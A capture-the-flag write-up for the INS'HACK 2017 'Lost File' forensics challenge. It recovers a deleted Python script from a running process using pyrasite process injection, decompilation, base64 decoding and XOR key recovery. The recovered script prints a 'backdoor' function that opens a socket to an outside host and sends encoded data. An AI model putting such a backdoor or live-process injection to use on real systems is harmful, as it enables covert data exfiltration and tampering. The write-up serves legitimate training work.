# INS'HACK CTF 2017 : Lost File

**Category:** Forensic **Points:** 225 **Solves:** 11

> Heeelp! I did a `rm` on my python file. All my work is gone! Would you help me restore it? 
> I usually work with a virtualenv if this info can help you.. ssh lost-file@lost-file.ctf.insecurity-insa.fr (password lost-file)


## Write-up

Connected to the SSH, we discover an Ubuntu container :

```bash
lost-file@96e4ef37ce94:/app$ id
uid=1000(lost-file) gid=1000(lost-file) groups=1000(lost-file)
lost-file@96e4ef37ce94:/app$ uname -a
Linux 96e4ef37ce94 4.4.0-64-generic #85-Ubuntu SMP Mon Feb 20 11:50:30 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
lost-file@96e4ef37ce94:/app$ dmesg
...
[796484.276553] docker0: port 5(vethbae9065) entered forwarding state
[796484.276563] docker0: port 5(vethbae9065) entered forwarding state
[796486.360168] docker0: port 5(vethbae9065) entered disabled state
[796486.360237] veth573e33d: renamed from eth0
...
```

Now, we are looking for our python file removed with `rm`. We guess that we will have to recover it from process or memory.

A possibility is that this python script still running : 
```bash
lost-file@96e4ef37ce94:/app$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
lost-fi+     1  0.0  0.0   4508   712 ?        Ss   13:14   0:00 /bin/sh -c ./run.sh && rm -f ./run.
lost-fi+     6  0.0  0.3  21908  6072 ?        S    13:14   0:00 python2 /app/challenge.py
lost-fi+    10  0.0  0.1  18228  3276 ?        S    13:14   0:00 /bin/bash
lost-fi+    16  0.0  0.1  34424  2864 ?        R+   13:16   0:00 ps aux
```

Nice, so our challenge.py still running. We also see that we are able to install new Python packages.

After some research, [fser](https://twitter.com/aifsair) found this source to recover lost Python source code if it's still resident in-memory : https://gist.github.com/simonw/8aa492e59265c1a021f5c5618f9e6b12

Let's try to attach an interactive prompt using pyrasite with our Python process :
```bash
$ pip install pyrasite
$ pip install uncompyle6
$  ~/.local/bin/pyrasite-shell 6
>>> dir()
['DistantInteractiveConsole', 'InteractiveConsole', 'ReverseConnection', 'ReversePythonConnection', 'ReversePythonShell', 'StringIO', '__builtins__', '__doc__', '__file__', '__name__', '__package__', 'base64', 'c', 'cycle', 'izip', 'pyrasite', 'socket', 'sys', 'threading', 'time', 'traceback', 'uncompyle6', 'x']
>>> globals()
{'izip': <type 'itertools.izip'>, 'InteractiveConsole': <class code.InteractiveConsole at 0x7ff355c0fc80>, 'ReverseConnection': <class '__main__.ReverseConnection'>, 'base64': <module 'base64' from '/usr/lib/python2.7/base64.pyc'>, 'uncompyle6': <module 'uncompyle6' from '/home/lost-file/.local/lib/python2.7/site-packages/uncompyle6/__init__.pyc'>, '__package__': None, '__doc__': '\n:mod:`pyrasite.reverse` - Pyrasite Reverse Connection Payload\n=============================================================\n', 'pyrasite': <module 'pyrasite' from '/home/lost-file/.local/lib/python2.7/site-packages/pyrasite/__init__.pyc'>, '__builtins__': <module '__builtin__' (built-in)>, '__file__': '/app/challenge.py', 'sys': <module 'sys' (built-in)>, 'ReversePythonShell': <class '__main__.ReversePythonShell'>, '__name__': '__main__', 'cycle': <type 'itertools.cycle'>, 'c': '\nbgwMFA0XEUYXCgIPBxFvDwkVDhYWRRYfF28HFg0IRQ8QABMQDQoJFUQMDBQNFxFGBxwCCAdvbwIBA0ECAwwJTk1fa0RCRUUWFgwPEARNRz8LEEEMAxMARgIECAgHAUdPbm8FAQRFAQkKAElNWG9FRkRFERYLCxEATEc2AQ4JRQILCwRGS29vAgEDQQIXCwZOTV9rREJFRQEICgMFDkUdbERFQUQFCQoEBQlBD2hFRUZEDlxGNRUwDgFcEQc0EFQpFCIKCAhHXmxERUFEGlgJBwkHBQVCFkkSXkdDSggKDAhMBgkWSgoXAkwESDoNFwFOBkxIRAQKF0YFSQNECwtFHA0VSRdOBhwFCABJEEtMTGxuAQQCQgcEBQ8BDgsQTUxcbkVBREIBBBIFWEMsCFEiLTZQUjUzJB8tCSALNiZRVSlVFgsjIwpRMCFVODEaAixEbkVBREJvRUZERRJEX0UWCQcOBBBMFgoFDwAVTBEKBg0BEU8lJDosKCExTUQRCgYNARFPNy0mLjk3MTMhIyhMbERFQUQRSwYJCgsEBxZNTURVS1BKU0tUREhFV1JUTExsREVBRBFLFgMKAUkcSkcND0ZJCk1Lb0VGREUSShEACwJMAQAQA0xvbA0DQTs9CwQLATo+RF9YRUQ7OgwFCws6OUZfa0RCRUUAEQsCTEtvRUZERQMFAQ4BCQsXSU1o\n', 'socket': <module 'socket' from '/usr/lib/python2.7/socket.pyc'>, 'StringIO': <class StringIO.StringIO at 0x7ff355c0fce8>, 'traceback': <module 'traceback' from '/usr/lib/python2.7/traceback.pyc'>, 'DistantInteractiveConsole': <class __main__.DistantInteractiveConsole at 0x7ff35438e1f0>, 'ReversePythonConnection': <class '__main__.ReversePythonConnection'>, 'threading': <module 'threading' from '/usr/lib/python2.7/threading.pyc'>, 'time': <module 'time' (built-in)>, 'x': <function <lambda> at 0x7ff355c48410>}
```

Sounds good, let see the x (lambda) and c:
```bash
>>> import uncompyle6
>>> uncompyle6.main.uncompyle(2.7, x.func_code, sys.stdout)
# uncompyle6 version 2.9.10
# Python bytecode 2.7
# Decompiled from: Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
# [GCC 5.4.0 20160609]
# Embedded file name: /app/challenge.py
return ''.join((chr(ord(c) ^ ord(k)) for c, k in izip(base64.decodestring(a), cycle(b))))
>>> print(c)
bgwMFA0XEUYXCgIPBxFvDwkVDhYWRRYfF28HFg0IRQ8QABMQDQoJFUQMDBQNFxFGBxwCCAdvbwIBA0ECAwwJTk1fa0RCRUUWFgwPEARNRz8LEEEMAxMARgIECAgHAUdPbm8FAQRFAQkKAElNWG9FRkRFERYLCxEATEc2AQ4JRQILCwRGS29vAgEDQQIXCwZOTV9rREJFRQEICgMFDkUdbERFQUQFCQoEBQlBD2hFRUZEDlxGNRUwDgFcEQc0EFQpFCIKCAhHXmxERUFEGlgJBwkHBQVCFkkSXkdDSggKDAhMBgkWSgoXAkwESDoNFwFOBkxIRAQKF0YFSQNECwtFHA0VSRdOBhwFCABJEEtMTGxuAQQCQgcEBQ8BDgsQTUxcbkVBREIBBBIFWEMsCFEiLTZQUjUzJB8tCSALNiZRVSlVFgsjIwpRMCFVODEaAixEbkVBREJvRUZERRJEX0UWCQcOBBBMFgoFDwAVTBEKBg0BEU8lJDosKCExTUQRCgYNARFPNy0mLjk3MTMhIyhMbERFQUQRSwYJCgsEBxZNTURVS1BKU0tUREhFV1JUTExsREVBRBFLFgMKAUkcSkcND0ZJCk1Lb0VGREUSShEACwJMAQAQA0xvbA0DQTs9CwQLATo+RF9YRUQ7OgwFCws6OUZfa0RCRUUAEQsCTEtvRUZERQMFAQ4BCQsXSU1o
```

Let's check the content of c :
```bash
$ echo "bgwMFA0XEUYXCgIPBxFvDwkVDhYWRRYfF28HFg0IRQ8QABMQDQoJFUQMDBQNFxFGBxwCCAdvbwIBA0ECAwwJTk1fa0RCRUUWFgwPEARNRz8LEEEMAxMARgIECAgHAUdPbm8FAQRFAQkKAElNWG9FRkRFERYLCxEATEc2AQ4JRQILCwRGS29vAgEDQQIXCwZOTV9rREJFRQEICgMFDkUdbERFQUQFCQoEBQlBD2hFRUZEDlxGNRUwDgFcEQc0EFQpFCIKCAhHXmxERUFEGlgJBwkHBQVCFkkSXkdDSggKDAhMBgkWSgoXAkwESDoNFwFOBkxIRAQKF0YFSQNECwtFHA0VSRdOBhwFCABJEEtMTGxuAQQCQgcEBQ8BDgsQTUxcbkVBREIBBBIFWEMsCFEiLTZQUjUzJB8tCSALNiZRVSlVFgsjIwpRMCFVODEaAixEbkVBREJvRUZERRJEX0UWCQcOBBBMFgoFDwAVTBEKBg0BEU8lJDosKCExTUQRCgYNARFPNy0mLjk3MTMhIyhMbERFQUQRSwYJCgsEBxZNTURVS1BKU0tUREhFV1JUTExsREVBRBFLFgMKAUkcSkcND0ZJCk1Lb0VGREUSShEACwJMAQAQA0xvbA0DQTs9CwQLATo+RF9YRUQ7OgwFCws6OUZfa0RCRUUAEQsCTEtvRUZERQMFAQ4BCQsXSU1o" | base64 -d > encode.txt
```

After some analysis, xoortool has been nice to us :
```bash
$ git clone https://github.com/hellman/xortool.git && cd xortool/ && sudo python setup.py install
$ xortool encode.txt -c 20
```

Result with 'deadbeef' as key : 
```python
import socket
import sys
from itertools import cycle

def fail():
    printf("You have failed")

def done():
    printf("Well done")

def func():
    global x
    global k
    k="WpUhe9pcVu1OpGklj";
    x=lambda s,t:"".join(chr(ord(a)^ord(b)) for a,b in zip(s,cycle(t)))

def backdoor():
    data="Hj4GKR53QQAzKmEjRD40O1sjGAo4VE0YUxgI"
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("1.1.1.1", 666))
    s.send(x("hi",k))
    s.send(data)

if __name__ == "__main__":
    func()
    backdoor()
```

Not enought to get a flag, we played with data, k and x but nothing. Then, we search for a backdoor on `lost-file.ctf.insecurity-insa.fr`, nop. Back to our container :
```bash
$ ssh lost-file@lost-file.ctf.insecurity-insa.fr
$ pip install pyrasite
$ ~/.local/bin/pyrasite-shell 6
>>> s1="WpUhe9pcVu1OpGklj"
>>> s2="Hj4GKR53QQAzKmEjRD40O1sjGAo4VE0YUxgI"
>>> x(s2,s1)
'INSA{N1ce_Pl4y_W1th_P1th0N}'
```
